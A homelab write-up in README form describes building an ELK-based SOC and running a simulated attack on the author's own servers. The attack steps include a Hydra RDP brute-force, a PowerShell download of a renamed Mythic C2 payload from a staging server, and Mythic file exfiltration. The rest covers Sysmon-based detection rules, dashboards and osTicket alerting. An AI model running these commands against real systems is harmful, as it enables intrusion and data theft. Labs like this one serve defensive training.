# ELK Stack SOC Homelab

## Objective

Build an end-to-end Security Operations Centre (SOC) homelab using the ELK Stack, Sysmon, and Mythic C2 to simulate, detect, and investigate real-world cyber attacks.

---

## Skills Learned

- Deployment and configuration of a complete ELK Stack (Elasticsearch, Logstash, and Kibana).
- Centralised log collection and analysis from Windows and Linux endpoints.
- Configuration of Elastic Agent and Fleet for endpoint management.
- Development of detection rules, alerts, and security dashboards.
- Practical experience simulating adversary behaviour using Mythic C2.
- Investigation of security events through log analysis and incident response workflows.
- Improved understanding of Security Operations Centre (SOC) processes and detection engineering.
- Strengthened analytical thinking and problem-solving through hands-on threat investigations.

---

## Tools Used

- **Elasticsearch** – Centralised storage, indexing, and searching of security logs.
- **Logstash** – Log ingestion, parsing, and data processing.
- **Kibana** – Visualisation, dashboards, and security investigations.
- **Elastic Agent & Fleet** – Endpoint management and log collection.
- **Sysmon** – Enhanced Windows endpoint telemetry.
- **Mythic C2** – Adversary simulation and command-and-control framework.
- **osTicket** – Ticketing and incident management workflow.
- **VirtualBox** – Virtual machine hosting for the lab environment.
- **Windows Event Logs** & **Linux System Logs** – Endpoint telemetry and monitoring.

---

# Lab Build Process

## 1. Lab Architecture

The diagram below illustrates the overall architecture of the SOC homelab.

The core security infrastructure is hosted within a Vultr Virtual Private Cloud (VPC), where Elasticsearch, Kibana, Fleet Server, and osTicket are isolated from the monitored systems. This provides a dedicated private network for the logging and monitoring platform.

Windows and Ubuntu endpoints are hosted outside the VPC and securely forward telemetry using Elastic Agent, with Fleet providing centralised agent management. A dedicated Kali Linux attack machine and Mythic C2 server are used to simulate adversary activity, while the SOC analyst connects remotely to Kibana to monitor, investigate, and respond to security events.

<img width="808" height="875" alt="image" src="https://github.com/user-attachments/assets/ca629d5f-51b0-447e-ba67-f17a8bd33504" />


---

# 2. Deploying the ELK Stack

## 2.1 Provisioning the Server

Provisioned an Ubuntu cloud instance within Vultr and secured remote access by creating a firewall group that only permits SSH connections from my public IP address. After connecting via SSH, I updated the operating system before installing Elasticsearch.

Installed Elasticsearch, enabled the service to start automatically at boot, and verified that it was running successfully before continuing with the deployment.

**Elasticsearch service running successfully**

<img width="2522" height="506" alt="Elasticsearch Running" src="https://github.com/user-attachments/assets/44478cdf-045e-48cd-ad56-eaf26c34a698" />

---

## 2.2 Installing Kibana

Installed Kibana on the Ubuntu server. Once Elasticsearch was confirmed to be operational, generated a Kibana enrolment token from the `elasticsearch/bin` directory to securely authenticate Kibana with the Elasticsearch cluster.

**Command**

```bash
./elasticsearch-create-enrollment-token --scope kibana
```

The generated token was used during Kibana's initial setup to establish a trusted connection with the Elasticsearch deployment.

**Generating the Kibana enrolment token**

<img width="2544" height="536" alt="Kibana Enrolment Token" src="https://github.com/user-attachments/assets/1a31ce20-911b-4fd9-bd56-b9e23d9000b7" />

---

## 2.3 Configuring Kibana

Connected to Kibana using the enrolment token generated during the previous step. During the initial configuration, Kibana prompted for three encryption keys required to securely store encrypted saved objects and enable alerting, actions, and other security features.

Configured the required encryption keys within the `kibana.yml` configuration file via the SSH session before restarting the Kibana service to apply the changes.

After restarting the service, logged back into Kibana and verified that the configuration had completed successfully. The **Alerts** dashboard and additional security features were now available.

**Kibana Alerts dashboard after successful configuration**

<img width="2549" height="1268" alt="Kibana Alerts Dashboard" src="https://github.com/user-attachments/assets/8bffe90d-2f15-47cf-8c78-76b558740850" />

---

## 3.0 Installing Windows Server

Deployed a Windows Server 2022 cloud instance outside the Vultr VPC to simulate a monitored endpoint on an external network. Configured Remote Desktop Protocol (RDP) to allow inbound connections from the internet, enabling the server to receive automated scans and authentication attempts. This generated realistic Windows security telemetry, which will be collected by Elastic Agent and forwarded to the ELK Stack for analysis, detection engineering, and threat hunting.

---


## 3.1 Installing Elastic Agent

To onboard the Windows endpoint into the ELK Stack, Elastic Agent was downloaded directly from the Fleet management interface and installed using the generated enrolment command.

During deployment, the Fleet Server was configured to listen on **TCP port 8220**. The Windows server was granted access to this port through the Vultr firewall, allowing secure communication between the endpoint and Fleet Server.

After successful enrolment, the Elastic Agent appeared in **Fleet**, confirming that the endpoint was communicating successfully with the Fleet Server and receiving its assigned policy.

---

## 3.2 Verifying Log Ingestion

With the agent successfully enrolled, Windows Security events began flowing into Elasticsearch. Using Kibana Discover, the Windows host was filtered to verify that authentication events and other telemetry were being ingested correctly.

This confirmed that the Windows endpoint was successfully forwarding logs to the ELK Stack and was ready for detection engineering, threat hunting, and attack simulation.

<img width="2550" height="630" alt="image" src="https://github.com/user-attachments/assets/9cf3b19f-1936-4cf6-b13b-c14788c4f1d6" />


## 3.2 Sysmon

Downloaded Sysmon and the Olaf Hartong configuration file, then installed Sysmon on the Windows endpoint using the custom configuration to enhance Windows event logging for security monitoring in Elastic.

Added two **Custom Windows Event Logs** integrations in Elastic to collect endpoint security telemetry from the Windows machine. The first was configured to ingest **Sysmon** events from the **Microsoft-Windows-Sysmon/Operational** event channel, providing detailed visibility into process creation, network connections, file activity, and other endpoint events. The second was configured for **Microsoft Defender**, filtering ingestion to **Event IDs 1116, 1117, and 5001** to capture malware detections, remediation actions, and instances where Microsoft Defender real-time protection was disabled.


<img width="2542" height="1171" alt="image" src="https://github.com/user-attachments/assets/fe705af8-bc21-4dc9-82dd-e17c056663af" />

---

Provisioned a new Ubuntu endpoint and configured the Elastic Agent to monitor /var/log/auth.log using a dedicated MyDFIR-Linux-Policy agent policy. Once the agent was enrolled, authentication logs began streaming into Elasticsearch, providing visibility into SSH login activity. Initial log analysis revealed multiple failed SSH authentication attempts, the majority originating from the IP address 111.235.76.92, indicating likely automated brute-force scanning against the exposed SSH service.

<img width="2555" height="1158" alt="image" src="https://github.com/user-attachments/assets/64f4c070-5d96-4bae-8bb2-41318e60b166" />

### Investigating Failed SSH Login Attempts

To look for failed SSH login attempts, I filtered `agent.name` to my Linux machine and then used `system.auth.ssh.event: Failed`, which returned **216 events**.

I added `system.auth.ssh.event`, `user.name`, `source.ip`, and `source.geo.country_name` as columns. This made it easier to see which usernames were being used in the failed attempts, where the connections were coming from, and the countries associated with the source IPs.

<img width="2231" height="1059" alt="image" src="https://github.com/user-attachments/assets/8c2d8ce4-963c-46dd-a949-84e9bcff8151" />


### Creating an SSH Brute Force Alert

I created an alert rule named `MyDFIR-Brute Force Activity` to detect when more than **5 failed SSH login attempts occur within a 5-minute window**, with the rule checking every minute.

I am aware that this is a fairly basic detection rule and could generate false positives in a real production environment. However, for the purpose of this lab, it provides a good opportunity to practise creating alert rules and working through the detection and investigation process in Elastic.


### Visualising Failed SSH Attempts

To visualise where the failed SSH login attempts were coming from, I created a **Choropleth map** in Elastic Maps and applied the following KQL query:

`system.auth.ssh.event: * and agent.name: MyDFIR-Linux and system.auth.ssh.event: Failed`

I used `source.geo.country_iso_code` to map the events to their source countries. This provides a visual overview of the geographical locations associated with the failed SSH attempts.

I then created a dashboard and added the map so the SSH activity could be monitored and visualised from one place.

<img width="1684" height="818" alt="image" src="https://github.com/user-attachments/assets/d38f6287-ae5e-4711-959c-86fbe7460c4f" />

Also decided to duplicate that map and modify the KQL to show successful SSH attempts too. 

<img width="1536" height="1180" alt="image" src="https://github.com/user-attachments/assets/0670ae1c-4994-4827-9f86-4d47f4d5f507" />


### RDP Failed Activity

Decided to create the same search for RDP for the Windows machine. 

Searched for Windows Event ID **4625 (Failed Logon)** in Kibana Discover using:

```text
event.code: 4625
```

Added the `user.name` and `source.ip` fields as columns to make it easier to identify the accounts targeted by failed authentication attempts and the source IP addresses responsible for the login attempts.

<img width="942" height="1158" alt="image" src="https://github.com/user-attachments/assets/302d12c8-efbf-444c-9e28-cf6b682317ad" />

Saved that query and made a rule for it

<img width="1287" height="994" alt="image" src="https://github.com/user-attachments/assets/90626dd9-d739-4db8-b664-db45af907c07" />

### Improving SSH and RDP Brute-Force Detection Rules

The alerts generated by the previous SSH and RDP detection rules contained limited information, making it more difficult to quickly identify the source of suspicious authentication activity and investigate the alerts.

To improve the detections, I created new **threshold-based rules** for both SSH and RDP brute-force attempts.

The new **SSH brute-force rule** monitors failed SSH authentication attempts targeting the `root` account. Events are aggregated by `user.name` and `source.ip`, with an alert generated when **5 or more failed authentication attempts** meet the rule conditions.

The new **RDP brute-force rule** monitors Windows Event ID `4625` for failed logon attempts targeting the `Administrator` account. Events are aggregated by `source.ip` and `user.name`, with an alert generated when **5 or more failed authentication attempts** meet the detection criteria.

By grouping events using the source IP address and targeted username, these updated rules provide more useful context for investigating potential brute-force attacks and make it easier to identify which account is being targeted and where the authentication attempts originated.

<img width="2304" height="976" alt="image" src="https://github.com/user-attachments/assets/654abf26-24d6-4606-bbdf-be1e43fa3f1b" />

<img width="2308" height="1016" alt="image" src="https://github.com/user-attachments/assets/5edc7195-2477-42fb-a5eb-ff2a84b84431" />

### Adding RDP Authentication Maps to the Dashboard

Created two additional maps in Kibana to visualise **failed and successful RDP authentication attempts**. These were added to the existing dashboard alongside the two previously created **SSH authentication maps**.

For successful RDP authentication, I used Windows Event ID `4624` and filtered the `winlog.event_data.LogonType` field for **Logon Type 10** (RemoteInteractive/RDP) and **Logon Type 7** (Unlock).

The following KQL query was used:

```kql
event.code: 4624 and (winlog.event_data.LogonType: 10 or winlog.event_data.LogonType: 7)

```

<img width="2558" height="730" alt="image" src="https://github.com/user-attachments/assets/5d417e5e-749b-4c79-87d0-a0c7f6da5055" />

### Adding Authentication Tables to the Dashboard

Created four tables to provide a clearer view of the authentication activity being collected from the Windows and Linux endpoints. Two tables show **successful and failed SSH authentication attempts**, while the other two show **successful and failed RDP authentication attempts**.

Each table displays the **top 10 results** using the following fields:

- `user.name` – The username used during the authentication attempt.
- `source.ip` – The source IP address of the connection.
- `source.geo.country_name` – The country associated with the source IP address.
- `Count of records` – The number of authentication events.

These tables were added alongside the authentication maps on the dashboard. The maps give a visual overview of where authentication attempts are coming from, while the tables provide more detailed information about the usernames, source IP addresses, countries, and number of authentication attempts.

<img width="2555" height="1263" alt="image" src="https://github.com/user-attachments/assets/ac8f54a7-eb35-488f-92fd-1c19db9db025" />

## Attack Simulation Plan

To test the monitoring and detection capabilities of the SOC environment, I will carry out a simulated attack against the Windows Server. The attack will follow six phases, starting with initial access and ending with simulated data exfiltration.

### Phase 1 – Initial Access

The attack will begin from the Kali Linux attacker machine with an **RDP brute-force attack** against the Windows Server.

After obtaining the correct credentials, I will successfully authenticate to the Windows Server via RDP. This will generate both failed and successful authentication activity that can be monitored and investigated in Elastic.

### Phase 2 – Discovery

Once access to the Windows Server has been gained, I will perform basic **system discovery** through the RDP session.

This will simulate an attacker gathering information about the compromised machine and its environment before continuing with further actions.

### Phase 3 – Defence Evasion

The next phase will simulate an attacker attempting to weaken the security controls on the compromised system.

While connected through RDP, I will attempt to **disable Microsoft Defender** on the Windows Server. This activity should generate security events that can later be identified and investigated in Elastic.

### Phase 4 – Execution

A **Mythic C2 agent** will be introduced to the compromised Windows Server.

PowerShell IEX will be used as part of the process to retrieve the Mythic agent, which will then be transferred to the Windows Server and executed. This will simulate an attacker executing a malicious payload after gaining access to the system.

### Phase 5 – Command and Control

Once the Mythic agent is running, it will establish a **Command and Control (C2)** connection between the compromised Windows Server and the Mythic C2 server.

This will simulate an attacker establishing remote communication with the compromised system, allowing commands to be issued through the C2 infrastructure.

### Phase 6 – Exfiltration

The final phase will simulate **data exfiltration** from the compromised Windows Server.

A test file named `passwords.txt` containing dummy data will be created on the Windows Server. Using the established Mythic C2 connection, the file will then be transferred from the Windows Server to the Mythic C2 server.

This attack simulation will generate activity across several stages of an attack, allowing me to investigate the resulting logs and alerts within Elastic and see how the different stages of the attack appear from a SOC analyst's perspective.

<img width="2548" height="9120" alt="image" src="https://github.com/user-attachments/assets/6480d532-133b-4a9e-b1a5-2d8a4fa87d9b" />

### Mythic C2 Server Setup

Set up a dedicated **Ubuntu cloud instance** to host the Mythic Command and Control (C2) server for the attack simulation.

The Mythic server was placed behind its own firewall, with rules configured to restrict access to only the systems required for the lab. Firewall rules were added to allow communication from my **public IP address**, which is also used by the locally hosted Kali Linux VM, as well as the public IP addresses of the **cloud-hosted Linux and Windows machines**.

This keeps the Mythic C2 infrastructure isolated from unnecessary external access while still allowing the required communication between the systems used throughout the attack simulation.
<img width="2557" height="1113" alt="image" src="https://github.com/user-attachments/assets/57caebd5-7321-4f5c-b92f-2bba5fa284b6" />

### Phase 1 – RDP Brute Force

Created a `passwords.txt` file on the Windows victim machine to be used later in the attack simulation.

On the Kali Linux attacker machine, I created a smaller custom wordlist using the first 50 entries from `rockyou.txt`:

```bash
sudo head -50 rockyou.txt > /home/kali/mydfir-wordlist.txt
```

Using a smaller wordlist is sufficient for this lab and avoids the need to run the attack using the entire `rockyou.txt` wordlist. I then added the correct password for the Windows `Administrator` account to `mydfir-wordlist.txt`.

For the first phase of the attack simulation, I used **Hydra** to perform an RDP brute-force attack against the Windows victim machine using the newly created wordlist.

The initial Hydra command experienced issues establishing multiple RDP connections, so I modified the command to reduce the number of simultaneous connections and add a delay between connection attempts:

```bash
hydra -t 1 -W 3 -l Administrator -P mydfir-wordlist.txt rdp://<WINDOWS_SERVER_IP>
```

This resulted successful authentication, providing realistic activity that can be investigated in Elastic using the detection rules and dashboard visualisations created earlier in the project.

<img width="1678" height="281" alt="image" src="https://github.com/user-attachments/assets/bf9bdb61-b222-4236-89f8-0d6726e6b027" />

After successfully finding the Administrator password during the RDP brute-force attack, I logged into the Windows machine from my Kali Linux machine using `xfreerdp`.

## Phase 2 – Windows Enumeration

After successfully gaining access to the Windows machine, I ran several commands to gather some basic information about the system and the Administrator account.

Used:

```cmd
whoami
```

to confirm the account I was currently logged in as.

Then ran:

```cmd
ipconfig
```

to view the machine's network configuration and IP address.

Used:

```cmd
net user
```

to list the local user accounts on the Windows machine.

I also tried:

```cmd
net group
```

This returned an error because the machine is not a Windows Domain Controller.


<img width="595" height="512" alt="image" src="https://github.com/user-attachments/assets/25882def-0213-4ad9-9530-65d68f6a9c53" />

Finally, I ran:

```cmd
net user administrator
```

to get more information about the Administrator account, including whether the account was active, password settings, last logon time, and group membership.

These commands simulate some basic enumeration that an attacker might perform after gaining access to a Windows system.

<img width="728" height="452" alt="image" src="https://github.com/user-attachments/assets/f2466ac8-a5e2-4fce-ac3c-71ed7300c2a1" />

## Phase 3 – Defence Evasion

To simulate defence evasion, I opened **Windows Security** and disabled **Microsoft Defender real-time protection** and **cloud-delivered protection**.

This simulates an attacker attempting to disable security controls after gaining access to a system.

<img width="1014" height="752" alt="image" src="https://github.com/user-attachments/assets/1cc8517a-8fc2-4616-95af-36df6a415d39" />


## Phase 4 – Command and Control (C2)

For the next phase of the attack simulation, I set up **Mythic C2** using the **Apollo agent** and an HTTP C2 profile. The goal was to establish a C2 connection with the Windows victim machine and generate realistic endpoint and network activity for analysis in Elastic.

First, I installed the Apollo agent:

```bash
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```
I then installed the HTTP C2 profile:

```bash
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

Using the Mythic web interface, I created an Apollo payload and configured the callback settings to point back to my Mythic server.

<img width="2326" height="1149" alt="image" src="https://github.com/user-attachments/assets/a3173865-eee9-4754-9abd-c8e323693f25" />

Once the payload was generated, I downloaded it to the Mythic server and renamed it:

```text
svchost-MyDFIR.exe
```

To make the payload available to the Windows victim machine, I started a temporary Python HTTP server from the directory containing the file:

```bash
python3 -m http.server 9999
```

I also allowed port `9999` through the Mythic server's firewall:

```bash
ufw allow 9999
```

From the Windows victim machine, which I accessed through an RDP session from Kali Linux, I downloaded the payload using PowerShell:

```powershell
Invoke-WebRequest -Uri http://<MYTHIC-SERVER-IP>:9999/svchost-MyDFIR.exe -OutFile "C:\Users\Public\Downloads\svchost-MyDFIR.exe"
```
<img width="604" height="174" alt="image" src="https://github.com/user-attachments/assets/1d7dc4f8-9315-4af7-b443-4d9f4b2d0f40" />


I then executed the payload on the Windows machine. This successfully established an active callback from the victim machine to the Mythic C2 server.

This simulated an attacker deploying a C2 agent after gaining access to a compromised system, while also generating activity that could later be investigated using the ELK stack.

## Phase 5 – C2 Activity

With an active callback established, I used the Mythic C2 interface to interact remotely with the Windows victim machine.

I ran basic discovery commands through the Apollo agent, including commands to identify the current user and gather information about the compromised system and its network configuration.

This simulated post-compromise activity where an attacker uses an established C2 channel to gather information about the system before carrying out further actions.

<img width="2555" height="777" alt="image" src="https://github.com/user-attachments/assets/41eec23a-715f-476a-9e9f-b0a1edfabe95" />

## Phase 6 – Data Exfiltration

For the final phase of the attack simulation, I simulated data exfiltration by retrieving a test file called `passwords.txt` from the Windows victim machine through the established Mythic C2 connection.

The file was located at:

```text
C:\Users\Administrator\Documents\passwords.txt
```

Using the Mythic C2 interface, I downloaded the file with:

```text
download C:\Users\Administrator\Documents\passwords.txt
```

This simulated an attacker using an established C2 channel to retrieve data from a compromised endpoint.

<img width="2317" height="706" alt="image" src="https://github.com/user-attachments/assets/40394349-351e-45d9-892d-6d0a340a71f3" />


## Investigating the Mythic Payload

After establishing a callback from the Mythic agent, I searched for the payload name:

```kql
svchost-MyDFIR.exe
```
<img width="2258" height="1040" alt="image" src="https://github.com/user-attachments/assets/a3d140ab-6570-40ca-84d6-6aeacd3e667b" />
This returned all logs associated with the payload, allowing me to follow its execution through Sysmon.

### File Creation (Sysmon Event ID 11)

The first event identified was a **File Create** event (Sysmon Event ID 11), confirming the payload had been written to disk.

Relevant fields included:

```text
winlog.event_data.TargetFilename:
C:\Users\Public\Downloads\svchost-MyDFIR.exe

User:
MYDFIR-WIN\Administrator
```

This confirmed the executable was dropped into the Public Downloads directory by the Administrator account.

---

### Process Creation (Sysmon Event ID 1)

Next, I searched for **Sysmon Event ID 1** to identify when the payload was executed.
<img width="2261" height="1130" alt="image" src="https://github.com/user-attachments/assets/65d25895-2cdd-45a7-bfa3-77ffa1906330" />
The Process Create event contained additional information including the file hashes, original filename and parent process.

One interesting observation was that although the executable had been renamed to **svchost-MyDFIR.exe**, the embedded metadata still contained its original filename:

```text
winlog.event_data.OriginalFileName:
Apollo.exe
```

This is useful during investigations, as attackers often rename payloads while leaving the original PE metadata untouched.

The parent process was also **powershell.exe**, matching the delivery method used during the attack.

---

### Hash Analysis

The Process Create event exposed several useful hashes:

```text
SHA1:
E00AF41759DBDAEC0E5F084D97BA2FF56B9E269C

MD5:
EA1E165C42F9AEA7031B1F387757BCFC

SHA256:
DDA32F10E87847B5721744BEFA8BA92CB1D3F28A0889B47AE5C1DA3BBD07091B

IMPHASH:
F34D5F2D4577ED6D9CEEC516C1F5A744
```

I checked the SHA1 hash against VirusTotal, which returned **0 detections**. This is expected for a freshly generated Mythic payload, as the payload can be regenerated with different hashes, making simple hash-based detections unreliable. However, checking the reputation of a file is still a worthwhile step during any investigation.

---

### Creating a Detection Rule

To create a simple detection, I searched for the process creation event alongside the payload name and either the known SHA256 hash or the original filename.

```kql
svchost-MyDFIR.exe and event.code: 1 and winlog.event_data.Hashes: *DDA32F10E87847B5721744BEFA8BA92CB1D3F28A0889B47AE5C1DA3BBD07091B*
or winlog.event_data.OriginalFileName: Apollo.exe

```
<img width="2254" height="1125" alt="image" src="https://github.com/user-attachments/assets/efe90459-359d-47eb-8b87-bd10c153915c" />


The initial query returned two events because it matched both **Sysmon Event ID 1 (Process Create)** and **Sysmon Event ID 7 (Image Loaded)**.

For this detection I only wanted to identify when the payload was **executed**, so I refined the query to look exclusively for **Process Create** events. This also meant the payload name was no longer required, as the SHA256 hash and original filename were sufficient indicators.

```kql
event.code: 1 and (
  winlog.event_data.Hashes: *DDA32F10E87847B5721744BEFA8BA92CB1D3F28A0889B47AE5C1DA3BBD07091B* or
  winlog.event_data.OriginalFileName: Apollo.exe
)
```

This returned a single matching event representing the execution of the Mythic payload.

I then created a **Custom Query** detection rule in Elastic Security using this query and assigned it a **Critical** severity.

To make investigations easier, I configured the alert to display several useful fields:

- `@timestamp`
- `host.hostname`
- `message`
- `winlog.event_data.CommandLine`
- `winlog.event_data.Image`
- `winlog.event_data.ParentCommandLine`
- `winlog.event_data.ParentImage`
- `winlog.event_data.ProcessGuid`
- `winlog.event_data.User`

These fields provide useful context during triage, allowing an analyst to quickly identify what executed, how it was launched, the parent process responsible and which user account was involved.
<img width="2289" height="1172" alt="image" src="https://github.com/user-attachments/assets/f4708dd6-262e-4a92-b697-ddd45abbd894" />

## Threat Hunting Dashboard

To complement the detection rule, I created a dashboard highlighting several high-value Sysmon events that are commonly used during investigations.

### Sysmon Event ID 3 - Network Connections

Displays processes initiating outbound network connections, making it easier to identify suspicious external communications.

### Sysmon Event ID 1 - Process Creation

Monitors newly created processes with a focus on commonly abused Windows utilities such as:

- `powershell.exe`
- `cmd.exe`
- `rundll32.exe`

These are frequently used by attackers for execution, persistence and post-exploitation activities.

### Sysmon Event ID 5001

Displays events where **Microsoft Defender real-time protection** has been disabled. Since attackers commonly attempt to disable security controls early in an intrusion, this provides a useful indicator of potential compromise.


## Creating the Dashboard

When creating the dashboard, I initially searched using only the Sysmon event IDs. I quickly noticed that some events were not actually generated by Sysmon, but by other Windows providers such as **Virtual Disk Service**. To ensure the visualisations only displayed Sysmon telemetry, I filtered each query by the event provider.

I also updated the custom Mythic detection rule created earlier to include the same filter:

```kql
event.provider: Microsoft-Windows-Sysmon
```

This guarantees the rule only evaluates Sysmon Process Create events rather than similarly numbered events from other Windows event providers.

---

### Outbound Network Connections

I began by looking at **Sysmon Event ID 3**, which records network connections initiated by processes.

```kql
event.code: 3 and event.provider: Microsoft-Windows-Sysmon
```

This returned over **100,000 events**, which was expected as almost every application on the system establishes network connections.

To reduce the noise, I added the following filter:

```kql
winlog.event_data.Initiated: true
```

The **Initiated** field indicates whether the connection was initiated by the local host. Setting this to **true** filters out inbound or passive network activity, allowing the dashboard to focus on outbound connections made by processes running on the endpoint. This provides a much clearer view of potential command-and-control traffic, malware callbacks or other suspicious external communications.

---

### Dashboard Queries

#### Process Creation

Monitors new processes, with a focus on commonly abused Windows utilities.

```kql
event.code: 1 and (powershell or cmd or rundll32) and event.provider: Microsoft-Windows-Sysmon
```

#### Outbound Network Connections

Displays outbound connections initiated by processes on the endpoint.

```kql
event.code: 3 and event.provider: Microsoft-Windows-Sysmon and winlog.event_data.Initiated: true
```

#### Microsoft Defender Disabled

Monitors Windows Defender events indicating that real-time protection has been disabled.

```kql
event.code: 5001 and event.provider: Microsoft-Windows-Windows Defender
```




## Building the Endpoint Activity Dashboard

With the detection rule complete, I created a dashboard to provide a quick overview of endpoint activity that could assist during investigations.

### Process Creation

The first panel displays **Sysmon Event ID 1 (Process Create)**, focusing on commonly abused Windows binaries:

```kql
event.code: 1 and (powershell or cmd or rundll32) and event.provider: Microsoft-Windows-Sysmon
```

To improve readability, I customised the table by:

- Removing the **Other** category.
- Increasing the number of returned values to **999**.
- Renaming columns to shorter, more readable names.
- Removing fields that weren't useful for this lab, including **Timestamp**, **ProcessGuid** and **Hostname**. Since only a single endpoint was being monitored, these fields added little value and took up unnecessary space.

The final table highlights:

- User
- Parent Image
- Parent Command Line
- Image
- Command Line
- Current Directory

These fields provide enough context to understand what executed, how it was launched and which account was responsible.

---

### Outbound Network Connections

The second panel focuses on **Sysmon Event ID 3**, showing processes initiating outbound network connections.

```kql
event.code: 3
and event.provider: Microsoft-Windows-Sysmon
and winlog.event_data.Initiated: true
and not winlog.event_data.Image:*MsMpEng.exe
and not winlog.event_data.Image:*MpDefenderCoreService.exe
```

The initial query was dominated by Microsoft Defender making legitimate outbound connections. Since these were expected and obscured more interesting activity, I excluded the Defender processes to reduce noise and improve visibility of other outbound connections.

The table displays:

- Image
- Source IP
- Destination IP
- Destination Port

During the simulated attack, this also highlighted the Mythic payload establishing outbound communications.

---

### Microsoft Defender Disabled

The final panel monitors **Windows Defender Event ID 5001**, which indicates that Microsoft Defender real-time protection has been disabled.

```kql
event.code: 5001
and event.provider: Microsoft-Windows-Windows Defender
```

Ideally, I wanted to display the full event message. However, Lens does not currently expose the `message` field in a useful way for this visualisation. Instead, I included:

- Hostname
- Product Name
- Event Code

In this lab only a single host was monitored, so the hostname is already known. In a production environment, however, including the hostname would be essential for quickly identifying which endpoint generated the alert.

<img width="2559" height="1122" alt="image" src="https://github.com/user-attachments/assets/88b06b26-7c1f-4752-bd10-e8435a9a0d2c" />

## osTicket Server Setup

A **Windows Server 2022** virtual machine was created to host the osTicket environment. After connecting via RDP, **XAMPP** was installed to provide the Apache web server, PHP and MySQL services required by osTicket.

### Configure Apache

The Apache configuration file was edited to replace `localhost` with the server's IP address, allowing the web server to be accessed remotely.



### Configure phpMyAdmin

Within the `phpMyAdmin` directory, a backup of `config.inc.php` was created before making any changes.

The MySQL host was then updated from `localhost` to the server's IP address:

```php
$cfg['Servers'][$i]['host'] = 'Public IP';
$cfg['Servers'][$i]['connect_type'] = 'tcp';
```


### Configure Windows Firewall

A new inbound Windows Defender Firewall rule was created to allow:

- TCP **80** (HTTP)
- TCP **443** (HTTPS)

### Start Services

The **Apache** and **MySQL** services were started from the XAMPP Control Panel.

To verify the installation, phpMyAdmin was opened in a web browser and a successful connection to the MariaDB server confirmed that the web server and database services were functioning correctly.


<img width="1750" height="1106" alt="image" src="https://github.com/user-attachments/assets/284ce536-0a1e-4c7b-8032-4bc4e7dcb701" />

### osTicket Installation & Configuration

To make the lab feel more like a real SOC environment, I installed **osTicket** on the Windows Server 2022 VM to act as a helpdesk and ticketing system.

I created a new MySQL database called `MyDFIR-Lab-DB` in phpMyAdmin, granted the required permissions, and completed the osTicket setup through the web installer. Once the installation was complete, I secured the configuration by resetting the permissions on the `ost-config.php` file:

<img width="851" height="438" alt="image" src="https://github.com/user-attachments/assets/e2bda378-859b-4fb3-9eb1-f79feaa018fd" />

```powershell
icacls include\ost-config.php /reset
```

Finally, I connected to the helpdesk from my SOC Analyst workstation to confirm everything was working as expected.

<img width="1019" height="427" alt="image" src="https://github.com/user-attachments/assets/f7c7cd8a-0688-42a1-9a7b-1cc00d6ac3e4" />

This gives the lab a dedicated ticketing platform that can be used later for documenting incidents and practising a more realistic SOC workflow.


## Elastic Webhook Integration with osTicket

To improve the realism of the SOC lab, I integrated **Elastic** with **osTicket** so alerts can automatically generate helpdesk tickets. This simulates how many SOCs track incidents through an ITSM or ticketing platform.

### Configuration

An API key was created in osTicket and restricted to the ELK server's private IP address. This key is used to authenticate requests sent from Elastic to the osTicket API.

Within **Kibana**, I navigated to **Stack Management → Connectors** and created a new **Webhook** connector. The connector was configured to send HTTP POST requests to the osTicket API endpoint using the API key for authentication.

<img width="1669" height="1143" alt="image" src="https://github.com/user-attachments/assets/2a2239f0-02a0-4b51-9e26-f29844324bb4" />

### Result

The connector successfully created a new ticket in osTicket containing the test alert, message content and file attachments.

<img width="1027" height="1169" alt="image" src="https://github.com/user-attachments/assets/c5a1b169-fdd8-4b32-8627-280eafa170fe" />


This integration provides a realistic incident management workflow where security alerts can be tracked, assigned and investigated through a ticketing system, closely reflecting how many Security Operations Centres manage incidents.

The ticketing system also supports the **Accounting** component of the **AAA (Authentication, Authorisation and Accounting)** model by maintaining an audit trail of security events, investigations and analyst actions.

## Automating osTicket Creation from Elastic Alerts

I added the **osTicket webhook connector** as an action on my SSH brute-force detection rule. This allows Elastic to automatically create an osTicket ticket when the rule triggers.

The XML body uses Elastic variables so information from the alert can be added to the ticket:

```xml
<ticket alert="true" autorespond="true" source="API">
    <name>Elastic</name>
    <email>api@osticket.com</email>
    <subject>{{rule.name}}</subject>
    <message type="text/plain"><![CDATA[Please investigate the rule: {{rule.name}}
    Link: {{rule.url}}]]></message>
</ticket>
```
<img width="1255" height="1110" alt="image" src="https://github.com/user-attachments/assets/0ee286cd-66b1-4b2a-9274-3ad559cd0498" />
I also made changes to the `.yml` configuration on the ELK server to allow `{{rule.url}}` to generate a link back to Elastic. However, the URL still did not populate in the ticket and will need further troubleshooting.

The rule itself successfully triggered the webhook and created a ticket in osTicket with the correct **rule name and investigation message**, confirming the main integration is working.

<img width="1092" height="1078" alt="image" src="https://github.com/user-attachments/assets/f46e5c2d-7e0d-41fc-a457-f69c017a97dc" />

## RDP Brute-Force Investigation

Next, I tested the **RDP brute-force detection rule** and investigated one of the alerts it generated.

### Alert Details

<img width="2303" height="1173" alt="RDP brute-force alert" src="https://github.com/user-attachments/assets/58c8d3e8-1ed0-4459-b4cf-94290e425c7f" />

From the alert, I identified:

- **Source IP:** `71.172.38.43`
- **Targeted user:** `Administrator`
- **Events:** 5 failed authentication events

The RDP brute-force rule was also configured to use the **osTicket webhook connector** and to run **every 1 minute**. This allows detected RDP brute-force activity to automatically generate a ticket in osTicket for further investigation.

### Investigating the Source IP

I then investigated the source IP and worked through the same questions used during the SSH brute-force investigation.

#### Is this IP known to perform brute-force activity?

**Yes.**

Threat intelligence checks showed that the IP has previously been associated with malicious/brute-force activity.

<img width="1456" height="1217" alt="IP reputation check" src="https://github.com/user-attachments/assets/7edf7b37-73de-42b1-8d45-523db962caea" />

#### Were any other users affected by this IP?

**No.** Searching the activity associated with `71.172.38.43` showed that only the `Administrator` account was targeted.

<img width="2531" height="1101" alt="Elastic user investigation" src="https://github.com/user-attachments/assets/a634df44-c18d-4b0d-a280-5585d6bad48e" />

#### Were any login attempts successful?

**No.** I found no successful authentication attempts associated with the source IP.

#### What activity occurred after the login?

As there were **no successful logins**, there was no post-login activity to investigate.

### Successful RDP Login from Kali Linux

I then checked for RDP activity originating from the IP address associated with my **Kali Linux machine**. Unlike the previous external brute-force attempt, this test resulted in a successful authentication.

<img width="1972" height="626" alt="image" src="https://github.com/user-attachments/assets/2751677d-674f-4eb9-a9f4-7bc2bf70bdd3" />

**Is this IP known to perform brute-force activity?**  
No.

**Were any other users affected by this IP?**  
No. Only the `Administrator` account was targeted.

**Were any login attempts successful?**  
